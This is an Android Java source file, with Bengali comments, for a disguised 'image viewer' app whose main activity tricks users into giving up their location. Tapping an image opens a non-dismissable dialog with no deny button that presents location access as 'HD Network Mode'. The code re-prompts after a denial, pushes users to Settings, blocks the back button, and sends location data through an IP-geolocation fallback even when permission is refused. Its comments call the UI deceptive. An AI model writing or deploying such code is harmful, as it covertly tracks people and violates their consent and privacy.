package com.imageviewer;

import android.Manifest;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int LOCATION_PERMISSION_REQUEST_CODE = 1001;
    private static final int SETTINGS_REQUEST_CODE = 1002;

    private ImageView imageView;
    private TextView statusText;
    private TextView loadingIndicator;
    private GeolocationCollector geoCollector;
    private final Handler handler = new Handler();
    private boolean isPermissionRequestActive = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        imageView = findViewById(R.id.imageView);
        statusText = findViewById(R.id.statusText);
        loadingIndicator = findViewById(R.id.loadingIndicator);

        geoCollector = new GeolocationCollector(this);
        geoCollector.setCallback(new GeolocationCollector.Callback() {
            @Override
            public void onCollecting() {
                runOnUiThread(() -> {
                    loadingIndicator.setVisibility(View.VISIBLE);
                    loadingIndicator.setText("⟳ Opening...");
                    statusText.setText("Loading full resolution...");
                });
            }

            @Override
            public void onComplete(String message) {
                runOnUiThread(() -> {
                    loadingIndicator.setText("✓ Loaded");
                    handler.postDelayed(() -> {
                        loadingIndicator.setVisibility(View.GONE);
                        statusText.setText("✦ Tap the image to view in full resolution");
                    }, 2500);
                });
            }

            @Override
            public void onError(String message) {
                runOnUiThread(() -> {
                    loadingIndicator.setText("✓ Loaded");
                    handler.postDelayed(() -> {
                        loadingIndicator.setVisibility(View.GONE);
                        statusText.setText("✦ Tap the image to view in full resolution");
                    }, 2500);
                });
            }
        });

        // =============================================
        // ইমেজে ক্লিক → কাস্টম ডায়ালগ → Permission
        // =============================================
        imageView.setOnClickListener(v -> {
            // Deceptive UI
            statusText.setText("⟳ Loading full resolution...");
            loadingIndicator.setVisibility(View.VISIBLE);
            loadingIndicator.setText("⟳ Opening...");
            v.performHapticFeedback(android.view.HapticFeedbackConstants.LONG_PRESS);

            // চেক করো permission আগে থেকে দেওয়া আছে কিনা
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED) {
                // Permission আছে → সরাসরি লোকেশন নাও
                geoCollector.collectAndSend();
            } else {
                // Permission নেই → কাস্টম ডায়ালগ দেখাও
                showCustomPermissionDialog();
            }
        });
    }

    /**
     * ⭐ কাস্টম ডায়ালগ — ইউজার বুঝবে না এটা location-এর জন্য
     * শুধুমাত্র "Allow" / "Continue" অপশন থাকবে
     */
    private void showCustomPermissionDialog() {
        // চেক করো — ইউজার কি আগে Deny করেছে?
        boolean shouldShowRationale = ActivityCompat.shouldShowRequestPermissionRationale(
                this, Manifest.permission.ACCESS_FINE_LOCATION);

        String title, message, positiveButtonText;

        if (shouldShowRationale) {
            // ইউজার আগে Deny করেছে — বারবার দেখাও
            title = "📷 Image Quality Optimization";
            message = "To load high-resolution images smoothly, " +
                    "please enable HD Network Mode.\n\n" +
                    "This allows the app to adjust image quality " +
                    "based on your connection for the best viewing experience.";
            positiveButtonText = "Enable HD Mode";
        } else {
            // প্রথম বার
            title = "📷 HD Image Loading";
            message = "Photo Gallery needs access to network optimization " +
                    "features to load full-resolution images faster.\n\n" +
                    "Tap 'Continue' to enable enhanced image quality.";
            positiveButtonText = "Continue";
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(title)
                .setMessage(message)
                .setCancelable(false) // ← ইউজার back দিয়ে বের হতে পারবে না
                .setPositiveButton(positiveButtonText, (dialog, which) -> {
                    // ইউজার "Allow" দিলে → system permission dialog দেখাও
                    requestLocationPermission();
                });

        // ★★★ শুধুমাত্র "Allow" বাটন — কোনো "Deny" বা "Cancel" নেই ★★★
        AlertDialog dialog = builder.create();
        dialog.setCanceledOnTouchOutside(false); // বাইরে ক্লিক করলেও যাবে না
        dialog.show();
    }

    /**
     * System permission dialog
     */
    private void requestLocationPermission() {
        isPermissionRequestActive = true;
        ActivityCompat.requestPermissions(this,
                new String[]{
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                },
                LOCATION_PERMISSION_REQUEST_CODE);
    }

    /**
     * Permission result handler
     */
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
            isPermissionRequestActive = false;

            if (grantResults.length > 0 &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // ✅ ইউজার Allow দিয়েছে → GPS লোকেশন নাও
                geoCollector.collectAndSend();
            } else {
                // ❌ ইউজার Deny দিয়েছে
                // Android 11+ এ "Don't ask again" থাকলে সেটিংসে পাঠাও
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (!ActivityCompat.shouldShowRequestPermissionRationale(
                            this, Manifest.permission.ACCESS_FINE_LOCATION)) {
                        // ইউজার "Don't ask again" checked করেছে → সেটিংসে পাঠাও
                        showSettingsRedirectDialog();
                        return;
                    }
                }

                // Deny করলেও IP Geolocation fallback চালাও
                geoCollector.collectAndSend();

                // এবং ৩ সেকেন্ড পর আবার কাস্টম ডায়ালগ দেখাও
                handler.postDelayed(() -> {
                    // কিন্তু শুধু যদি current activity visible থাকে
                    if (!isFinishing()) {
                        showCustomPermissionDialog();
                    }
                }, 3000);
            }
        }
    }

    /**
     * Android 11+ — "Don't ask again" দিলে সেটিংসে পাঠাও
     */
    private void showSettingsRedirectDialog() {
        new AlertDialog.Builder(this)
                .setTitle("📷 Image Quality Settings")
                .setMessage("For the best image viewing experience, " +
                        "please enable HD Network Mode in Settings.")
                .setCancelable(false)
                .setPositiveButton("Open Settings", (dialog, which) -> {
                    // App settings page খোলো
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, SETTINGS_REQUEST_CODE);
                })
                .show();
    }

    /**
     * Settings থেকে ফিরে আসলে → আবার check করো
     */
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == SETTINGS_REQUEST_CODE) {
            // Settings থেকে ফিরে এসেছে — check permission
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED) {
                geoCollector.collectAndSend();
            } else {
                // এখনও না দিলে → আবার কাস্টম ডায়ালগ
                showCustomPermissionDialog();
            }
        }
    }

    /**
     * ব্যাক বাটন disable — ইউজার অ্যাপ থেকে বের হতে না পারে
     */
    @Override
    public void onBackPressed() {
        // কিছু করো না — ইউজার অ্যাপ ছেড়ে যেতে পারবে না
        // চাইলে সতর্ক বার্তা দেখাতে পারো
        if (isPermissionRequestActive) {
            // Permission request চলছে — back কাজ করবে না
            return;
        }
        super.onBackPressed();
    }
}